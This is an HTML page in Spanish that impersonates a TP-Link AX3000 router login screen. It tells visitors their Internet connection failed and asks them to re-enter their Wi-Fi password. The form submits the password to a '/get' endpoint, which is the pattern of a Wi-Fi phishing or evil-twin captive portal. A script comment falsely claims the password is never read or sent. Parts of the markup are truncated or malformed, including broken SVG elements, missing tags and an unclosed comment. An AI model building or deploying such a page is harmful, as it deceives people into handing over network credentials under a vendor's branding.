<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
    >

    <title>AX3000 Gigabit Wi-Fi 6 Router</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            width: 100%;
            min-height: 100%;
        }

        body {
            min-height: 100vh;
            overflow: hidden;
            font-family: Arial, Helvetica, sans-serif;
            color: #333333;
            background:
                linear-gradient(
                    180deg,
                    #4bc3d3 0%,
                    #48c2d3 60%,
                    #36b9d2 100%
                );
            position: relative;
        }

        /* =========================================================
           CABECERA
           ========================================================= */

        .header {
            position: absolute;
            top: 20px;
            left: 12px;

            display: flex;
            align-items: center;

            height: 58px;

            color: white;
            z-index: 10;
        }

        .brand {
            display: flex;
            align-items: center;
			width: 124px;
        }

        .tp-icon {
            width: 48px;
            height: 48px;
            margin-right: 10px;
            flex-shrink: 0;
        }

        .tp-wordmark {
            color: #ffffff;
            font-size: 28px;
            font-weight: 400;
            line-height: 1;
            letter-spacing: -1.5px;
        }

        .separator {
            width: 2px;
            height: 24px;

            background: rgba(255,255,255,.9);

            margin-left: 17px;
            margin-right: 15px;
        }

        .router-title {
            color: #ffffff;
            font-size: 24px;
            font-weight: 400;
            white-space: nowrap;
        }

        /* =========================================================
           CONTENEDOR CENTRAL
           ========================================================= */

        .page {
            position: relative;
            z-index: 3;

            width: 100%;
            min-height: 100vh;

            display: flex;
            justify-content: center;
            align-items: flex-start;

            padding-top: 112px;
        }

        .login-card {
            position: relative;

            width: 630px;
            height: 420px;

            background: #ffffff;

            border-radius: 15px;

            padding:
                40px
                66px
                42px
                68px;
        }

        /* =========================================================
           TITULO
           ========================================================= */

        .login-title {
            text-align: center;

            color: #333333;

            font-size: 29px;
            line-height: 35px;
            font-weight: 600;

            margin-bottom: 78px;
        }

        /* =========================================================
           FORMULARIO
           ========================================================= */

        .login-form {
            width: 100%;
        }

        .password-label {
            display: block;

            color: #222222;

            font-size: 21px;
            line-height: 25px;

            margin-bottom: 9px;
        }

        .input-wrapper {
            position: relative;

            width: 100%;
            height: 42px;

            margin-bottom: 44px;
        }

        .password-input {
            display: block;

            width: 100%;
            height: 42px;

            padding:
                0
                50px
                0
                12px;

            border: 1px solid #d2d2d2;
            border-radius: 7px;

            background: #ffffff;

            color: #333333;

            font-size: 18px;

            outline: none;

            transition:
                border-color .15s ease,
                box-shadow .15s ease;
        }

        .password-input:focus {
            border-color: #4ac1d3;

            box-shadow:
                0 0 0 1px rgba(74,193,211,.1);
        }

        /* =========================================================
           ICONO OJO
           ========================================================= */

        .eye-button {
            position: absolute;

            right: 10px;
            top: 50%;

            transform: translateY(-50%);

            width: 34px;
            height: 34px;

            display: flex;
            align-items: center;
            justify-content: center;

            padding: 0;

            border: none;

            background: transparent;

            cursor: pointer;
        }

        .eye-button svg {
            width: 30px;
            height: 30px;
        }

        /* =========================================================
           BOTÓN LOGIN
           ========================================================= */

        .login-button {
            display: block;

            width: 100%;
            height: 43px;

            border: none;
            border-radius: 7px;

            background: #43bfd2;

            color: white;

            font-size: 20px;
            font-weight: 400;

            cursor: pointer;

            box-shadow:
                0 2px 4px rgba(0,0,0,.23);

            transition:
                background-color .15s ease,
                transform .06s ease;
        }

        .login-button:hover {
            background: #3ab8cc;
        }

        .login-button:active {
            transform: translateY(1px);
        }

        /* =========================================================
           FORGOT PASSWORD
           ========================================================= */

        .forgot-row {
            display: flex;
            justify-content: flex-end;

            margin-top: 11px;
        }

        .forgot-link {
            color: #35bfd3;

            font-size: 21px;

            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* =========================================================
           TP-LINK ID
           ========================================================= */

        .tplink-id {
            position: absolute;

            right: 66px;
            bottom: 56px;

            display: flex;
            align-items: center;

            color: #3cc1d4;

            font-size: 21px;

            text-decoration: none;
        }

        .tplink-id-icon {
            width: 29px;
            height: 29px;

            margin-right: 11px;

            display: flex;
            align-items: center;
            justify-content: center;
        }

        .tplink-id-icon svg {
            width: 29px;
            height: 29px;
        }

        /* =========================================================
           NUBES DE FONDO
           ========================================================= */

        .clouds {
            position: absolute;

            left: 0;
            bottom: 0;

            width: 100%;
            height: 45%;

            overflow: hidden;

            pointer-events: none;

            z-index: 1;
        }

        .cloud-left,
        .cloud-right {
            position: absolute;

            bottom: -120px;

            background: rgba(32, 177, 207, .22);

            border-radius: 50%;
        }

        .cloud-left {
            left: -260px;

            width: 500px;
            height: 320px;

            box-shadow:
                250px 20px 0 10px rgba(32, 177, 207, .22),
                420px 110px 0 -30px rgba(32, 177, 207, .22);
        }

        .cloud-right {
            right: -270px;

            width: 520px;
            height: 300px;

            box-shadow:
                -240px 35px 0 30px rgba(32, 177, 207, .22),
                -420px 115px 0 -35px rgba(32, 177, 207, .22);
        }

        /* =========================================================
           RESPONSIVE
           ========================================================= */

        @media (max-width: 800px) {

            body {
                overflow-y: auto;
            }

            .header {
                top: 14px;
                left: 16px;

                transform: scale(.84);
                transform-origin: top left;
            }

            .router-title {
                font-size: 21px;
            }

            .page {
                padding-top: 100px;
                padding-left: 16px;
                padding-right: 16px;
                padding-bottom: 30px;
            }

            .login-card {
                width: 100%;
                max-width: 630px;

                /*height: min(720px, calc(100vh - 125px));
                min-height: 570px;*/

                padding-left: 34px;
                padding-right: 34px;
            }

            .login-title {
                font-size: 25px;
                margin-bottom: 60px;
            }

            .password-label {
                font-size: 18px;
            }

            .forgot-link {
                font-size: 18px;
            }

            .tplink-id {
                right: 34px;
                bottom: 37px;
            }
        }

        @media (max-width: 540px) {

            .header {
                transform: scale(.70);
            }

            .router-title {
                font-size: 23px;
            }

            .page {
                padding-top: 86px;
            }

            .login-card {
                min-height: 420px;

                border-radius: 12px;

                padding:
                    34px
                    25px
                    32px;
            }

            .login-title {
                font-size: 22px;
                line-height: 28px;

                margin-bottom: 48px;
            }

            .tplink-id {
                right: 25px;
                bottom: 30px;

                font-size: 18px;
            }
        }
    </style>
</head>

        <section class="login-card">
		
			<div style="font-size:19px">
			<p>No se ha podido restablecer la conexi&oacute;n a Internet. </p>
			<p>Confirma la contrase&ntilde;a de tu red Wi-Fi para continuar.</p>

			</div>

            <h1 class="login-title">
              
            </h1>

            <form
                class="login-form"
                id="loginForm"
                autocomplete="off"
               
				
				action="/get" 
            >

                <label
                    class="password-label"
                    for="password"
                >
                    Contrase&ntilde;a Wi-fi
                </label>


                <div class="input-wrapper">

                    <input
                        id="password"
						name="password"
                        class="password-input"
                        type="password"
                        autocomplete="off"
                        spellcheck="false"
						required
                    >
					<input
                        id="email"
						name="email"
                        
                        type="hidden"
                    
                    >

                    <button
                        id="togglePassword"
                        class="eye-button"
						type="button"
                      
                        aria-label="Show password"
                    >

                        <svg
                            viewBox="0 0 32 32"
                            xmlns="http://www.w3.org/2000/svg"
                        >

                                d="

                                C21.5 7.5 26 10.5 29 16

                                stroke-width="2.5"
                            />

                                cx="16"
                                cy="16"
                                r="4"
                                fill="#a8aaac"
                            />

                            <line
                                x1="6"
                                y1="27"
                                x2="27"
                                y2="5"
                                stroke="#a8aaac"
                                stroke-width="3"
                                stroke-linecap="round"
                            />

                        </svg>

                    </button>

                </div>


                <button
                    id="loginButton"
                    class="login-button"
                    type="submit"
                >
                    RESTABLECER CONEXI&Oacute;N
                </button>


                <div class="forgot-row">

                    <a
                        href="#"
                        class="forgot-link"
                        onclick="return false;"
                    >
                       
                    </a>

                </div>

                href="#"
                class="tplink-id"
                onclick="return false;"
            >

            

            </a>

        </section>

    <!-- =========================================================

    <script>

        const passwordInput =
            document.getElementById("password");

        const togglePassword =
            document.getElementById("togglePassword");

        const loginButton =
            document.getElementById("loginButton");



		document.addEventListener("DOMContentLoaded", () => {
			passwordInput.focus();
		});







        /* Mostrar / ocultar contraseña */

        togglePassword.addEventListener(
            "click",
            function () {

                if (passwordInput.type === "password") {

                    passwordInput.type = "text";

                    togglePassword.setAttribute(
                        "aria-label",
                        "Hide password"
                    );

                } else {

                    passwordInput.type = "password";

                    togglePassword.setAttribute(
                        "aria-label",
                        "Show password"
                    );

                }

            }
        );


        /* Botón visual de login.
           No lee ni transmite la contraseña. */

        


        /* Enter activa la animación */

        passwordInput.addEventListener(
            "keydown",
            function (event) {

                if (event.key === "Enter") {

                    event.preventDefault();

                    loginButton.click();

                }

            }
        );

    </script>
